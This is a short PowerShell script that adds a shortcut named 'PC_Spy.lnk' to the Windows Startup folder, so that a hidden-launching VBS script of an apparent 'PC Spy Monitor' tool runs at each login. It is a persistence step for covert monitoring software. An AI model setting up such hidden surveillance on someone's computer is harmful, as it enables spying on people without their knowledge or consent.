$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PC_Spy.lnk")
$Shortcut.TargetPath = "$PSScriptRoot\run_hidden.vbs"
$Shortcut.WorkingDirectory = "$PSScriptRoot"
$Shortcut.Description = "PC Spy Monitor"
$Shortcut.Save()
Write-Host "PC Spy successfully added to Startup!"
